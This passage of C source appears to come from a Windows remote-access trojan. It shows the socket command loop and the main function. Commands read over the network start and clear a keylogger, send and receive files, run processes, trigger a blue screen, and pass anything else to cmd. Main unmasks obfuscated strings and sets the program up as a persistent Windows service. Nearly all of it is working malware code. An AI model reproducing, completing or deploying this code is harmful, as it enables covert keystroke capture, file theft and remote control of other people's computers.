			if (!strcmp(cmd_p, SHELL_STRING_CMD_FMUON))     { main_cmd_fmuon();          continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_FMUOFF))    { main_cmd_fmuoff();         continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_BIEOFF))    { main_cmd_bieoff();         continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_OPENCLIP))  { main_cmd_openclip(sock);   continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_CLOSECLIP)) { main_cmd_closeclip(sock);  continue; }
			if (!strcmp(str1,  SHELL_STRING_CMD_SK))        { main_cmd_sk(sock, str2);   continue; }
			if (!strcmp(str1,  SHELL_STRING_CMD_REC))       { main_cmd_rec(str2);        continue; }
			if (!strcmp(str1,  SHELL_STRING_CMD_RECBG))     { main_cmd_recbg(str2);      continue; }
			if (!strcmp(str1,  SHELL_STRING_CMD_BSOD))      { main_cmd_bsod();           continue; }
			
			// keylogger
			if (!strcmp(str1,  SHELL_STRING_CMD_KL))      { main_cmd_kl(sock, str2); continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_KLSTOP))  { main_cmd_klstop(sock);   continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_KLCLEAN)) { main_cmd_klclean(sock);  continue; }
			
			if (!strcmp(cmd_p, SHELL_STRING_CMD_LKL))      { main_cmd_lkl(sock);      continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_LKLSTOP))  { main_cmd_lklstop(sock);  continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_LKLCLEAN)) { main_cmd_lklclean(sock); continue; }
			
			// send/recv files
			if (!strcmp(str1, SHELL_STRING_CMD_SF))   { main_cmd_sf(sock, str2);   continue; }
			if (!strcmp(str1, SHELL_STRING_CMD_RF))   { main_cmd_rf(sock, str2);   continue; }
			if (!strcmp(str1, SHELL_STRING_CMD_SFBG)) { main_cmd_sfbg(sock, str2); continue; }
			if (!strcmp(str1, SHELL_STRING_CMD_RFBG)) { main_cmd_rfbg(sock, str2); continue; }
			
			// run
			if (!strcmp(str1,  SHELL_STRING_CMD_RUN))    { main_cmd_run(sock, str2);    continue; }
			if (!strcmp(str1,  SHELL_STRING_CMD_BG))     { main_cmd_bg(sock, str2);     continue; }
			if (!strcmp(str1,  SHELL_STRING_CMD_PROC))   { main_cmd_proc(sock, str2);   continue; }
			if (!strcmp(str1,  SHELL_STRING_CMD_PROCBG)) { main_cmd_procbg(sock, str2); continue; }
			if (!strcmp(str1,  SHELL_STRING_CMD_BP))     { main_cmd_bp(sock, str2);     continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_USER))   { main_cmd_user(sock);         continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_KEYLOG)) { main_cmd_keylog(sock);       continue; }
			
			// redirect to cmd
			runCMD(sock, cmd_p);
		}
		
		closesocket(sock);
	}
	
	main_wsa_shutdown();
	
	// shutdown settings
	#if SHELL_STARTUP_KEYLOGGER
	keylog_stop();
	#endif
	
	if (stopService) { shell_service_stop(); }
	
	return 0;
}

int main(int argc, char** argv) {
	
	DPL("INIT: MAIN");
	
	D(
		printf("[DEBUG] MAX_PATH: %d\n", MAX_PATH)
	);

	// unhide obfuscated strings
	DPL("unmasking strings...");
	main_strings();
	DPL("unmasked strings.");

	// print info
	D(
		DWORD pid = GetCurrentProcessId();
		printf("[DEBUG] PID: %ld\n", pid);
		DWORD sessionID;
		ProcessIdToSessionId(pid, &sessionID);
		printf("[DEBUG] SID: %ld\n", sessionID);
		printf("[DEBUG] USERNAME: %s\n", getenv(SHELL_STRING_GETENV_USERNAME));
		printf("[DEBUG] USERDOMAIN: %s\n", getenv(SHELL_STRING_GETENV_USERDOMAIN));
		//system("set");
	);

	if (argc == 2) {
		if (!strcmp(argv[1], SHELL_STRING_CMD_USER))   { return shell_main(SHELL_MODE_USER);   }
		if (!strcmp(argv[1], SHELL_STRING_CMD_KEYLOG)) { return shell_main(SHELL_MODE_KEYLOG); }
	}
	
	#ifdef NOINJECT
		shell_main(SHELL_MODE_USER);
	#else
		// if the service doesn't start, create service
		if (!shell_service_start()) { shell_service_create(); }
	#endif
	
	return 0;
}